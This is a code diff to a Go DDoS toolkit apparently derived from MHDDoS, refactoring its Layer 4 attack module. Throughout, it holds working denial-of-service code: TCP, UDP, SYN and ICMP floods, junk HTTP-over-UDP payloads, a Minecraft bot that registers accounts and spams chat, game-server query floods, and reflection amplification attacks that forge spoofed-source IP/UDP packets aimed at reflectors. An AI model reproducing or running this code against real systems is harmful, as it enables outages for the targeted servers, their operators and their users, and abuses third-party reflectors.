@@ -8,9 +8,9 @@ import (
 	"sync"
 	"time"
 
-	"github.com/mhdthariq/MHDDoS/pkg/minecraft"
-	"github.com/mhdthariq/MHDDoS/pkg/proxy"
-	"github.com/mhdthariq/MHDDoS/pkg/utils"
+	"github.com/go-ddos-tools/pkg/minecraft"
+	"github.com/go-ddos-tools/pkg/proxy"
+	"github.com/go-ddos-tools/pkg/utils"
 )
 
 // Layer4Config holds configuration for Layer 4 attacks
@@ -27,7 +27,7 @@ type Layer4Config struct {
 
 // RunLayer4Attack executes a Layer 4 attack
 func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
-	for i := 0; i < cfg.Threads; i++ {
+	for i := range cfg.Threads {
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
@@ -68,6 +68,12 @@ func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Count
 		executeCPS(cfg, requestsSent, bytesSent)
 	case "CONNECTION":
 		executeCONNECTION(cfg, requestsSent, bytesSent)
+	case "OVH-UDP":
+		executeOVHUDP(cfg, requestsSent, bytesSent)
+	case "MCBOT":
+		executeMCBOT(cfg, requestsSent, bytesSent)
+	case "ICMP":
+		executeICMP(cfg, requestsSent, bytesSent)
 	case "MEM":
 		executeMEM(cfg, requestsSent, bytesSent)
 	case "NTP":
@@ -82,19 +88,13 @@ func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Count
 		executeARD(cfg, requestsSent, bytesSent)
 	case "RDP":
 		executeRDP(cfg, requestsSent, bytesSent)
-	case "OVH-UDP":
-		executeOVHUDP(cfg, requestsSent, bytesSent)
-	case "MCBOT":
-		executeMCBOT(cfg, requestsSent, bytesSent)
-	case "ICMP":
-		executeICMP(cfg, requestsSent, bytesSent)
 	default:
 		executeTCP(cfg, requestsSent, bytesSent)
 	}
 }
 
 func executeTCP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
 	if err != nil {
 		return
@@ -113,7 +113,7 @@ func executeTCP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -126,7 +126,7 @@ func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	defer conn.Close()
 
 	data := utils.RandomBytes(1024)
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		n, err := conn.Write(data)
 		if err != nil {
 			break
@@ -139,8 +139,8 @@ func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	// SYN flood requires raw sockets which need root/admin privileges
 	// This is a simplified version
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
-	for i := 0; i < 10; i++ {
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
+	for range 10 {
 		conn, err := net.DialTimeout("tcp", target, 100*time.Millisecond)
 		if err == nil {
 			conn.Close()
@@ -150,7 +150,7 @@ func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeMINECRAFT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
 	if err != nil {
 		return
@@ -175,7 +175,7 @@ func executeMINECRAFT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter)
 }
 
 func executeVSE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -194,7 +194,7 @@ func executeVSE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 		0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00,
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		n, err := conn.Write(payload)
 		if err != nil {
 			break
@@ -205,7 +205,7 @@ func executeVSE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeTS3(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -223,7 +223,7 @@ func executeTS3(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 		0x00, 0x00, 0x00, 0x00, 0x02,
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		n, err := conn.Write(payload)
 		if err != nil {
 			break
@@ -234,7 +234,7 @@ func executeTS3(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeFIVEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -249,7 +249,7 @@ func executeFIVEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	// FiveM query packet
 	payload := []byte{0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		n, err := conn.Write(payload)
 		if err != nil {
 			break
@@ -260,7 +260,7 @@ func executeFIVEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -272,7 +272,7 @@ func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 	}
 	defer conn.Close()
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		token := fmt.Sprintf("%s-%s-%s-%s",
 			utils.RandString(8),
 			utils.RandString(4),
@@ -291,7 +291,7 @@ func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 }
 
 func executeMCPE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	addr, err := net.ResolveUDPAddr("udp", target)
 	if err != nil {
 		return
@@ -315,7 +315,7 @@ func executeMCPE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 		0x61, 0x6c, 0x6c, 0x73,
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		n, err := conn.Write(payload)
 		if err != nil {
 			break
@@ -326,8 +326,8 @@ func executeMCPE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeCPS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
-	for i := 0; i < 10; i++ {
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
+	for range 10 {
 		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
 		if err == nil {
 			conn.Close()
@@ -337,7 +337,7 @@ func executeCPS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 }
 
 func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
 	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
 	if err != nil {
 		return
@@ -361,7 +361,10 @@ func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 // Helper function to create TCP checksum
 func tcpChecksum(data []byte) uint16 {
 	sum := uint32(0)
-	for i := 0; i < len(data)-1; i += 2 {
+	for i := range len(data) - 1 {
+		if i%2 != 0 {
+			continue
+		}
 		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
 	}
 	if len(data)%2 != 0 {
@@ -372,17 +375,6 @@ func tcpChecksum(data []byte) uint16 {
 	return uint16(^sum)
 }
 
-// Amplification attack helper - creates spoofed UDP packets
-func executeAmplification(cfg *Layer4Config, payload []byte, port int, requestsSent, bytesSent *utils.Counter) {
-	if len(cfg.Reflectors) == 0 {
-		return
-	}
-
-	// Create raw UDP socket
-	conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
-	if err != nil {
-		// Fallback to regular UDP if raw socket fails
-		executeAmplificationFallback(cfg, payload, port, requestsSent, bytesSent)
 func executeOVHUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	// OVH-UDP requires raw sockets for custom UDP packets with HTTP payloads
 	// This is a simplified implementation that sends UDP packets with HTTP-like payloads
@@ -398,8 +390,183 @@ func executeOVHUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	}
 	defer conn.Close()
 
+	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
+	paths := []string{"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\", "/", "/null", "/%00%00%00%00"}
+
+	for range utils.RandInt(2, 4) {
+		payloadSize := utils.RandInt(1024, 2048)
+		randomPart := string(utils.RandomBytes(payloadSize))
+
+		method := methods[rand.Intn(len(methods))]
+		path := paths[rand.Intn(len(paths))]
+
+		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
+			method, path, randomPart, cfg.Host, cfg.Port)
+
+		n, err := conn.Write([]byte(payload))
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+	}
+}
+
+func executeMCBOT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
+	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	// Generate UUID (simplified version - just use a random string)
+	uuid := fmt.Sprintf("%s-%s-%s-%s-%s",
+		utils.RandString(8),
+		utils.RandString(4),
+		utils.RandString(4),
+		utils.RandString(4),
+		utils.RandString(12))
+
+	// Send handshake with forwarding
+	handshake := minecraft.HandshakeForwarded(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 2, utils.RandIPv4(), uuid)
+	n1, err := conn.Write(handshake)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n1))
+
+	// Generate username and password
+	username := fmt.Sprintf("Bot_%s", utils.RandString(5))
+	password := utils.RandString(8)
+
+	// Send login packet
+	loginPacket := minecraft.Login(cfg.ProtocolID, username)
+	n2, err := conn.Write(loginPacket)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n2))
+
+	// Wait a bit before registering
+	time.Sleep(1500 * time.Millisecond)
+
+	// Send register command
+	registerCmd := fmt.Sprintf("/register %s %s", password, password)
+	registerPacket := minecraft.Chat(cfg.ProtocolID, registerCmd)
+	n3, err := conn.Write(registerPacket)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n3))
+
+	// Send login command
+	loginCmd := fmt.Sprintf("/login %s", password)
+	loginPacket2 := minecraft.Chat(cfg.ProtocolID, loginCmd)
+	n4, err := conn.Write(loginPacket2)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n4))
+
+	// Send spam chat messages
+	for range 10 {
+		chatMsg := utils.RandString(256)
+		chatPacket := minecraft.Chat(cfg.ProtocolID, chatMsg)
+		n, err := conn.Write(chatPacket)
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+		time.Sleep(1100 * time.Millisecond)
+	}
+}
+
+func executeICMP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// ICMP flooding requires raw sockets which need elevated privileges
+	// This is a simplified implementation using UDP as a fallback
+	// For full ICMP support, the application needs to be run with root/admin privileges
+
+	// Try to create raw ICMP socket (may fail without privileges)
+	conn, err := net.DialTimeout("ip4:icmp", cfg.Host, 1*time.Second)
+	if err != nil {
+		// Fallback to UDP if raw socket creation fails
+		target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
+		udpAddr, err := net.ResolveUDPAddr("udp", target)
+		if err != nil {
+			return
+		}
+		udpConn, err := net.DialUDP("udp", nil, udpAddr)
+		if err != nil {
+			return
+		}
+		defer udpConn.Close()
+
+		// Send ICMP-like payload via UDP
+		for range 100 {
+			payload := utils.RandomBytes(utils.RandInt(16, 1024))
+			n, err := udpConn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		return
+	}
+	defer conn.Close()
+
+	// Send ICMP echo requests
+	for i := range 100 {
+		// ICMP Echo Request
+		// Type: 8 (Echo Request), Code: 0
+		icmpType := byte(8)
+		icmpCode := byte(0)
+		checksum := uint16(0)
+		identifier := uint16(rand.Intn(65535))
+		sequence := uint16(i)
+
+		// Construct ICMP packet
+		payload := utils.RandomBytes(utils.RandInt(16, 1024))
+		packet := make([]byte, 8+len(payload))
+		packet[0] = icmpType
+		packet[1] = icmpCode
+		binary.BigEndian.PutUint16(packet[2:4], checksum)
+		binary.BigEndian.PutUint16(packet[4:6], identifier)
+		binary.BigEndian.PutUint16(packet[6:8], sequence)
+		copy(packet[8:], payload)
+
+		// Calculate checksum
+		checksum = tcpChecksum(packet)
+		binary.BigEndian.PutUint16(packet[2:4], checksum)
+
+		n, err := conn.Write(packet)
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+	}
+}
+
+// Amplification attack helper - creates spoofed UDP packets
+func executeAmplification(cfg *Layer4Config, payload []byte, port int, requestsSent, bytesSent *utils.Counter) {
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	// Create raw UDP socket
+	conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
+	if err != nil {
+		// Fallback to regular UDP if raw socket fails
+		executeAmplificationFallback(cfg, payload, port, requestsSent, bytesSent)
+		return
+	}
+	defer conn.Close()
+
 	// Build UDP packets with IP spoofing
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		for _, reflector := range cfg.Reflectors {
 			packet := buildUDPPacket(cfg.Host, reflector, cfg.Port, port, payload)
 			addr, err := net.ResolveIPAddr("ip4", reflector)
@@ -423,9 +590,9 @@ func executeAmplificationFallback(cfg *Layer4Config, payload []byte, port int, r
 		return
 	}
 
-	for i := 0; i < 100; i++ {
+	for range 100 {
 		for _, reflector := range cfg.Reflectors {
-			target := fmt.Sprintf("%s:%d", reflector, port)
+			target := net.JoinHostPort(reflector, fmt.Sprintf("%d", port))
 			addr, err := net.ResolveUDPAddr("udp", target)
 			if err != nil {
 				continue
@@ -466,15 +633,15 @@ func buildUDPPacket(srcIP, dstIP string, srcPort, dstPort int, payload []byte) [
 
 	// Build IP header
 	ipHeader := make([]byte, 20)
-	ipHeader[0] = 0x45                                    // Version 4, header length 5
-	ipHeader[1] = 0x00                                    // TOS
+	ipHeader[0] = 0x45                                                   // Version 4, header length 5
+	ipHeader[1] = 0x00                                                   // TOS
 	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(20+8+len(payload))) // Total length
 	binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))  // ID
-	ipHeader[6] = 0x00                                    // Flags
-	ipHeader[7] = 0x00                                    // Fragment offset
-	ipHeader[8] = 64                                      // TTL
-	ipHeader[9] = 17                                      // Protocol (UDP)
-	binary.BigEndian.PutUint16(ipHeader[10:12], 0)       // Checksum (calculated later)
+	ipHeader[6] = 0x00                                                   // Flags
+	ipHeader[7] = 0x00                                                   // Fragment offset
+	ipHeader[8] = 64                                                     // TTL
+	ipHeader[9] = 17                                                     // Protocol (UDP)
+	binary.BigEndian.PutUint16(ipHeader[10:12], 0)                       // Checksum (calculated later)
 	copy(ipHeader[12:16], src)
 	copy(ipHeader[16:20], dst)
 
@@ -492,7 +659,10 @@ func buildUDPPacket(srcIP, dstIP string, srcPort, dstPort int, payload []byte) [
 // Calculate IP checksum
 func ipChecksum(data []byte) uint16 {
 	sum := uint32(0)
-	for i := 0; i < len(data)-1; i += 2 {
+	for i := range len(data) - 1 {
+		if i%2 != 0 {
+			continue
+		}
 		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
 	}
 	if len(data)%2 != 0 {
@@ -557,162 +727,4 @@ func executeRDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	// RDP connection request
 	payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
 	executeAmplification(cfg, payload, 3389, requestsSent, bytesSent)
-	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
-	paths := []string{"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\", "/", "/null", "/%00%00%00%00"}
-
-	for i := 0; i < utils.RandInt(2, 4); i++ {
-		payloadSize := utils.RandInt(1024, 2048)
-		randomPart := string(utils.RandomBytes(payloadSize))
-
-		method := methods[rand.Intn(len(methods))]
-		path := paths[rand.Intn(len(paths))]
-
-		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
-			method, path, randomPart, cfg.Host, cfg.Port)
-
-		n, err := conn.Write([]byte(payload))
-		if err != nil {
-			break
-		}
-		requestsSent.Add(1)
-		bytesSent.Add(int64(n))
-	}
-}
-
-func executeMCBOT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
-	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-
-	// Generate UUID (simplified version - just use a random string)
-	uuid := fmt.Sprintf("%s-%s-%s-%s-%s",
-		utils.RandString(8),
-		utils.RandString(4),
-		utils.RandString(4),
-		utils.RandString(4),
-		utils.RandString(12))
-
-	// Send handshake with forwarding
-	handshake := minecraft.HandshakeForwarded(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 2, utils.RandIPv4(), uuid)
-	n1, err := conn.Write(handshake)
-	if err != nil {
-		return
-	}
-	bytesSent.Add(int64(n1))
-
-	// Generate username and password
-	username := fmt.Sprintf("Bot_%s", utils.RandString(5))
-	password := utils.RandString(8)
-
-	// Send login packet
-	loginPacket := minecraft.Login(cfg.ProtocolID, username)
-	n2, err := conn.Write(loginPacket)
-	if err != nil {
-		return
-	}
-	bytesSent.Add(int64(n2))
-
-	// Wait a bit before registering
-	time.Sleep(1500 * time.Millisecond)
-
-	// Send register command
-	registerCmd := fmt.Sprintf("/register %s %s", password, password)
-	registerPacket := minecraft.Chat(cfg.ProtocolID, registerCmd)
-	n3, err := conn.Write(registerPacket)
-	if err != nil {
-		return
-	}
-	bytesSent.Add(int64(n3))
-
-	// Send login command
-	loginCmd := fmt.Sprintf("/login %s", password)
-	loginPacket2 := minecraft.Chat(cfg.ProtocolID, loginCmd)
-	n4, err := conn.Write(loginPacket2)
-	if err != nil {
-		return
-	}
-	bytesSent.Add(int64(n4))
-
-	// Send spam chat messages
-	for i := 0; i < 10; i++ {
-		chatMsg := utils.RandString(256)
-		chatPacket := minecraft.Chat(cfg.ProtocolID, chatMsg)
-		n, err := conn.Write(chatPacket)
-		if err != nil {
-			break
-		}
-		requestsSent.Add(1)
-		bytesSent.Add(int64(n))
-		time.Sleep(1100 * time.Millisecond)
-	}
-}
-
-func executeICMP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
-	// ICMP flooding requires raw sockets which need elevated privileges
-	// This is a simplified implementation using UDP as a fallback
-	// For full ICMP support, the application needs to be run with root/admin privileges
-
-	// Try to create raw ICMP socket (may fail without privileges)
-	conn, err := net.DialTimeout("ip4:icmp", cfg.Host, 1*time.Second)
-	if err != nil {
-		// Fallback to UDP if raw socket creation fails
-		target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
-		udpAddr, err := net.ResolveUDPAddr("udp", target)
-		if err != nil {
-			return
-		}
-		udpConn, err := net.DialUDP("udp", nil, udpAddr)
-		if err != nil {
-			return
-		}
-		defer udpConn.Close()
-
-		// Send ICMP-like payload via UDP
-		for i := 0; i < 100; i++ {
-			payload := utils.RandomBytes(utils.RandInt(16, 1024))
-			n, err := udpConn.Write(payload)
-			if err != nil {
-				break
-			}
-			requestsSent.Add(1)
-			bytesSent.Add(int64(n))
-		}
-		return
-	}
-	defer conn.Close()
-
-	// Send ICMP echo requests
-	for i := 0; i < 100; i++ {
-		// ICMP Echo Request
-		// Type: 8 (Echo Request), Code: 0
-		icmpType := byte(8)
-		icmpCode := byte(0)
-		checksum := uint16(0)
-		identifier := uint16(rand.Intn(65535))
-		sequence := uint16(i)
-
-		// Construct ICMP packet
-		payload := utils.RandomBytes(utils.RandInt(16, 1024))
-		packet := make([]byte, 8+len(payload))
-		packet[0] = icmpType
-		packet[1] = icmpCode
-		binary.BigEndian.PutUint16(packet[2:4], checksum)
-		binary.BigEndian.PutUint16(packet[4:6], identifier)
-		binary.BigEndian.PutUint16(packet[6:8], sequence)
-		copy(packet[8:], payload)
-
-		// Calculate checksum
-		checksum = tcpChecksum(packet)
-		binary.BigEndian.PutUint16(packet[2:4], checksum)
-
-		n, err := conn.Write(packet)
-		if err != nil {
-			break
-		}
-		requestsSent.Add(1)
-		bytesSent.Add(int64(n))
-	}
 }
